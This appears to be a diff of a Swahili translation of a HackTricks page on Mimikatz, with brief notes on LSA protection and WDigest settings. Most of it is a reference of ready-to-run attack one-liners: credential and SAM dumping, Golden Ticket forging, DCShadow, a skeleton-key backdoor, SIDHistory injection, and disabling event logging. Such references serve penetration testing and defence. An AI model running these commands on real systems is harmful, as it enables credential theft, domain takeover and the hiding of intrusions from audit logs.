@@ -2,15 +2,16 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
+
 **Ukurasa huu unategemea mmoja kutoka [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Angalia asili kwa maelezo zaidi!
 
 ## LM na Maneno ya Kawaida katika kumbukumbu
 
 Kuanzia Windows 8.1 na Windows Server 2012 R2 kuendelea, hatua kubwa zimechukuliwa kulinda dhidi ya wizi wa akidi:
 
-- **LM hashes na maneno ya kawaida** hayahifadhiwi tena katika kumbukumbu ili kuboresha usalama. Mipangilio maalum ya rejista, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ inapaswa kuwekewa thamani ya DWORD ya `0` ili kuzima Uthibitishaji wa Digest, kuhakikisha maneno ya "kawaida" hayahifadhiwi katika LSASS.
+- **LM hashes na nywila za kawaida** hazihifadhiwi tena katika kumbukumbu ili kuboresha usalama. Mipangilio maalum ya rejista, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ inapaswa kuwekewa thamani ya DWORD ya `0` ili kuzima Uthibitishaji wa Digest, kuhakikisha kwamba nywila "za kawaida" hazihifadhiwi katika LSASS.
 
-- **Ulinzi wa LSA** umeanzishwa kulinda Mamlaka ya Usalama wa Mitaa (LSA) kutoka kwa usomaji wa kumbukumbu usioidhinishwa na sindikizo la msimbo. Hii inafikiwa kwa kuashiria LSASS kama mchakato uliohifadhiwa. Kuanzisha Ulinzi wa LSA kunahusisha:
+- **Ulinzi wa LSA** umeanzishwa ili kulinda mchakato wa Mamlaka ya Usalama wa Mitaa (LSA) kutoka kwa usomaji wa kumbukumbu usioidhinishwa na sindikizo la msimbo. Hii inafikiwa kwa kuashiria LSASS kama mchakato uliohifadhiwa. Kuanzisha Ulinzi wa LSA kunahusisha:
 1. Kubadilisha rejista katika _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kwa kuweka `RunAsPPL` kuwa `dword:00000001`.
 2. Kutekeleza Kituo cha Sera ya Kundi (GPO) kinacholazimisha mabadiliko haya ya rejista katika vifaa vinavyosimamiwa.
 
@@ -31,38 +32,38 @@ Hii inaruhusu kutolewa kwa kumbukumbu ya `lsass.exe` kwenye faili, ambayo inawez
 ```
 ## Mimikatz Options
 
-Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
+Kuharibu kumbukumbu za matukio katika Mimikatz kunahusisha hatua mbili kuu: kufuta kumbukumbu za matukio na kubadilisha huduma ya Matukio ili kuzuia kurekodi matukio mapya. Hapa chini kuna amri za kutekeleza hatua hizi:
 
 #### Clearing Event Logs
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+- **Command**: Hatua hii inalenga kufuta kumbukumbu za matukio, na kufanya iwe vigumu kufuatilia shughuli mbaya.
+- Mimikatz haitoi amri moja kwa moja katika nyaraka zake za kawaida za kufuta kumbukumbu za matukio moja kwa moja kupitia mstari wake wa amri. Hata hivyo, usimamizi wa kumbukumbu za matukio kwa kawaida unahusisha kutumia zana za mfumo au skripti nje ya Mimikatz kufuta kumbukumbu maalum (kwa mfano, kutumia PowerShell au Windows Event Viewer).
 
 #### Experimental Feature: Patching the Event Service
 
 - **Command**: `event::drop`
-- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
-- Example: `mimikatz "privilege::debug" "event::drop" exit`
+- Amri hii ya majaribio imeundwa kubadilisha tabia ya Huduma ya Kurekodi Matukio, kwa ufanisi kuzuia kurekodi matukio mapya.
+- Mfano: `mimikatz "privilege::debug" "event::drop" exit`
 
-- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
-- The `event::drop` command then patches the Event Logging service.
+- Amri ya `privilege::debug` inahakikisha kwamba Mimikatz inafanya kazi kwa ruhusa zinazohitajika kubadilisha huduma za mfumo.
+- Amri ya `event::drop` kisha inabadilisha huduma ya Kurekodi Matukio.
 
 ### Kerberos Ticket Attacks
 
 ### Golden Ticket Creation
 
-A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
+Golden Ticket inaruhusu upatanishi wa ufikiaji wa kiwango cha kikoa. Amri kuu na vigezo:
 
 - Command: `kerberos::golden`
 - Parameters:
-- `/domain`: Jina la domain.
-- `/sid`: Kitambulisho cha Usalama (SID) cha domain.
-- `/user`: Jina la mtumiaji wa kuiga.
-- `/krbtgt`: Hash ya NTLM ya akaunti ya huduma ya KDC ya domain.
+- `/domain`: Jina la kikoa.
+- `/sid`: Kitambulisho cha Usalama (SID) cha kikoa.
+- `/user`: Jina la mtumiaji wa kuigiza.
+- `/krbtgt`: Hash ya NTLM ya akaunti ya huduma ya KDC ya kikoa.
 - `/ptt`: Inachoma tiketi moja kwa moja kwenye kumbukumbu.
-- `/ticket`: Hifadhi tiketi kwa matumizi ya baadaye.
+- `/ticket`: Inahifadhi tiketi kwa matumizi ya baadaye.
 
-Example:
+Mfano:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
@@ -99,7 +100,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Amri: `kerberos::list`
 - Orodha ya tiketi zote za Kerberos kwa kikao cha mtumiaji wa sasa.
 
-- **Pita kwenye Kache**:
+- **Pita Kwenye Kache**:
 
 - Amri: `kerberos::ptc`
 - Inachanganya tiketi za Kerberos kutoka kwa faili za kache.
@@ -118,7 +119,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Uingiliaji wa Active Directory
 
-- **DCShadow**: Kufanya mashine kuwa DC kwa muda kwa ajili ya urekebishaji wa vitu vya AD.
+- **DCShadow**: Kufanya mashine ifanye kazi kama DC kwa ajili ya urekebishaji wa vitu vya AD.
 
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
@@ -127,74 +128,74 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Upatikanaji wa Akikazi
 
-- **LSADUMP::LSA**: Kutolewa kwa akiba kutoka LSA.
+- **LSADUMP::LSA**: Toa akiba kutoka LSA.
 
 - `mimikatz "lsadump::lsa /inject" exit`
 
 - **LSADUMP::NetSync**: Kuiga DC kwa kutumia data za nywila za akaunti ya kompyuta.
 
-- _Hakuna amri maalum iliyotolewa kwa NetSync katika muktadha wa asili._
+- _Hakuna amri maalum iliyotolewa kwa NetSync katika muktadha wa awali._
 
-- **LSADUMP::SAM**: Upatikanaji wa hifadhidata ya SAM ya ndani.
+- **LSADUMP::SAM**: Fikia hifadhidata ya SAM ya ndani.
 
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Kufungua siri zilizohifadhiwa kwenye rejista.
+- **LSADUMP::Secrets**: Fichua siri zilizohifadhiwa kwenye rejista.
 
 - `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: Kuweka hash mpya ya NTLM kwa mtumiaji.
+- **LSADUMP::SetNTLM**: Weka hash mpya ya NTLM kwa mtumiaji.
 
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Kupata taarifa za uthibitisho wa uaminifu.
+- **LSADUMP::Trust**: Pata taarifa za uthibitishaji wa uaminifu.
 - `mimikatz "lsadump::trust" exit`
 
 ### Mambo Mbalimbali
 
-- **MISC::Skeleton**: Kuingiza backdoor kwenye LSASS kwenye DC.
+- **MISC::Skeleton**: Ingiza backdoor kwenye LSASS kwenye DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Kuinua Haki
 
-- **PRIVILEGE::Backup**: Kupata haki za nakala.
+- **PRIVILEGE::Backup**: Pata haki za nakala.
 
 - `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Kupata haki za debug.
+- **PRIVILEGE::Debug**: Pata haki za debug.
 - `mimikatz "privilege::debug" exit`
 
-### Kutolewa kwa Akikazi
+### Utoaji wa Akikazi
 
-- **SEKURLSA::LogonPasswords**: Kuonyesha akiba za watumiaji walioingia.
+- **SEKURLSA::LogonPasswords**: Onyesha akiba za watumiaji walioingia.
 
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Kutolewa kwa tiketi za Kerberos kutoka kwenye kumbukumbu.
+- **SEKURLSA::Tickets**: Toa tiketi za Kerberos kutoka kwenye kumbukumbu.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
 ### Urekebishaji wa Sid na Token
 
-- **SID::add/modify**: Kubadilisha SID na SIDHistory.
+- **SID::add/modify**: Badilisha SID na SIDHistory.
 
 - Ongeza: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Badilisha: _Hakuna amri maalum ya kubadilisha katika muktadha wa asili._
+- Badilisha: _Hakuna amri maalum ya kubadilisha katika muktadha wa awali._
 
 - **TOKEN::Elevate**: Kuiga tokeni.
 - `mimikatz "token::elevate /domainadmin" exit`
 
 ### Huduma za Terminal
 
-- **TS::MultiRDP**: Kuruhusu vikao vingi vya RDP.
+- **TS::MultiRDP**: Ruhusu vikao vingi vya RDP.
 
 - `mimikatz "ts::multirdp" exit`
 
 - **TS::Sessions**: Orodha ya vikao vya TS/RDP.
-- _Hakuna amri maalum iliyotolewa kwa TS::Sessions katika muktadha wa asili._
+- _Hakuna amri maalum iliyotolewa kwa TS::Sessions katika muktadha wa awali._
 
 ### Vault
 
-- Kutolewa kwa nywila kutoka Windows Vault.
+- Toa nywila kutoka Windows Vault.
 - `mimikatz "vault::cred /patch" exit`
 
 
